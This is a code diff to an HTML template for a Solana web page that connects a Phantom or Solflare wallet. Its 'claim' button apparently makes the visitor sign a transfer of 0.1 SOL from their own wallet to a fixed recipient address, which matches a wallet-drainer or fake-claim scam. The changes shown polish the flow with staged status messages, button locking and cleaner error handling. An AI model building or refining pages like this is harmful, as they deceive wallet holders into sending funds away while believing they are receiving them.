@@ -86,7 +86,7 @@ HTML_TEMPLATE = """
       } else if (window.solflare?.isSolflare) {
         provider = window.solflare;
       } else {
-        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare.";
+        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare wallet browser.";
         qr.style.display = "block";
         return;
       }
@@ -97,9 +97,10 @@ HTML_TEMPLATE = """
         publicKey = response.publicKey || provider.publicKey;
         status.innerText = "✅ Connected: " + publicKey.toString();
         claimBtn.disabled = false;
+        qr.style.display = "none";
       } catch (err) {
         console.error("Connection failed:", err);
-        status.innerText = "❌ Wallet connection failed.";
+        status.innerText = "❌ Wallet connection failed or rejected.";
       }
     });
 
@@ -108,6 +109,10 @@ HTML_TEMPLATE = """
         status.innerText = "❌ Wallet not connected.";
         return;
       }
+
+      claimBtn.disabled = true;
+      connectBtn.disabled = true;
+      status.innerText = "⏳ Preparing transaction...";
 
       const network = networkSelect.value;
       const connection = new solanaWeb3.Connection(
@@ -122,22 +127,30 @@ HTML_TEMPLATE = """
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
             toPubkey: recipientPubkey,
-            lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
+            lamports: Math.floor(0.1 * solanaWeb3.LAMPORTS_PER_SOL),
           })
         );
 
         transaction.feePayer = publicKey;
-        const latestBlockhash = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = latestBlockhash.blockhash;
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
 
-        let signed = await provider.signTransaction(transaction);
-        const signature = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(signature);
+        status.innerText = "🔐 Awaiting your signature...";
+        const signedTransaction = await provider.signTransaction(transaction);
+
+        status.innerText = "🚀 Sending transaction...";
+        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+
+        status.innerText = "⏳ Confirming transaction...";
+        await connection.confirmTransaction(signature, 'confirmed');
 
         status.innerText = "✅ Transaction successful! Signature: " + signature;
       } catch (err) {
         console.error("Transaction failed:", err);
-        status.innerText = "❌ Transaction failed: " + err.message;
+        status.innerText = "❌ Transaction failed: " + (err.message || err.toString());
+      } finally {
+        claimBtn.disabled = false;
+        connectBtn.disabled = false;
       }
     });
   </script>
